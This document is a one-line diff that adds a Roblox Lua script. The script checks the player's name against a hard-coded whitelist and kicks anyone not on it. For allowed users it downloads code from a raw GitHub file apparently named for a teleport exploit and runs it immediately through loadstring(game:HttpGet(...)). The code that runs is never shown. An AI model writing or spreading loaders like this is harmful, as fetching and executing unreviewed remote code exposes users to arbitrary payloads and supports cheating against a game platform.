@@ -1,0 +1,1 @@
+local allowedUsernames={["9wenerd"]=true,["6atotkaca9"]=true,["seemyftur"]=true}local p=game.Players.LocalPlayer if not allowedUsernames[p.Name]then p:Kick("Access Denied")return end loadstring(game:HttpGet("https://raw.githubusercontent.com/aditpacked/ahhhrunika/refs/heads/main/TELEPORT%20AHHRHUUNIKHAKOMYOL"))()
